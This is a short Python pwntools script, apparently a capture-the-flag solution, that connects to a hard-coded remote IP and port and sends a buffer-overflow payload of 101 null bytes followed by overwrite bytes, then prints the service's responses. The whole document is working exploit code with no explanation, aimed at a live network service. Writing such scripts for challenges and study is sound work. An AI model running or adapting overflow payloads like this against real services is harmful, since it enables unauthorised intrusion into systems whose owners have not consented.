from pwn import *
from time import sleep

s = remote("103.237.99.35", 28103)
print s.recvuntil("1t.")
payload = "\x00"*101  + "\x5f\x40\x40\x40\x40"
s.sendline(payload)
print s.recv()
sleep(3)
print s.recv()
s.close()
